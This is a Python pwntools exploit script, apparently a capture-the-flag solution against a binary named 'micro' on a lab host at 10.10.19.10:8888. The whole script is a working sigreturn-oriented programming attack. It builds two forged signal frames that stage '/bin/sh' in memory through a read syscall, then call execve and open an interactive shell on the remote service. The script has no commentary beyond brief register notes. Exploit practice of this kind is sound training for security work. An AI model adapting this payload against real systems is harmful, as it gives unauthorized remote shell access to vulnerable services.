from pwn import *
context.arch = 'x86_64'
# p = gdb.debug('./micro', '''
# catch syscall execve
# c
# ''')
p = remote('10.10.19.10', 8888)
#p = process('./micro')
frame2 = SigreturnFrame()
frame2.rax = 0x3b  # syscall number for execve
frame2.rdi = 0x402000 + 128  # pointer to /bin/sh
frame2.rsi = 0x0  # NULL
frame2.rdx = 0x0  # NULL
frame2.rip = 0x40102D  # syscall;ret
frame2.rsp = 0x402000 + 128 + 32
frame2.rbp = 0x402000 + 128

frame = SigreturnFrame()
frame.rax = 0x0  # syscall number for read
frame.rdi = 0x0  # stdin
frame.rsi = 0x402000 + 128  # NULL
frame.rdx = len(b'/bin/sh' + 17 * b'R' + p64(0x40101C) + p64(0x40101C)+ p64(0x40102d) + bytes(frame2) + p64(0x40102d))  # NULL
frame.rip = 0x40102D  # syscall; ret
frame.rsp = 0x402000 + 128 + 32
frame.rbp = 0x402000 + 128


p.send(b'A' * 14 + b'/bin/sh' + b'\x00' * 11 + p64(0x401018) + p64(0x40102D) + bytes(frame))
input()
p.send(b'A' * 15)
input()
p.send(b'/bin/sh' + 17 * b'R' + p64(0x40101C) + p64(0x40101C)+ p64(0x40102d) + bytes(frame2) + p64(0x40102d))
input('LAST')
p.send(b'/bin/sh' + b'\x00' + b'U'*7)
p.interactive()

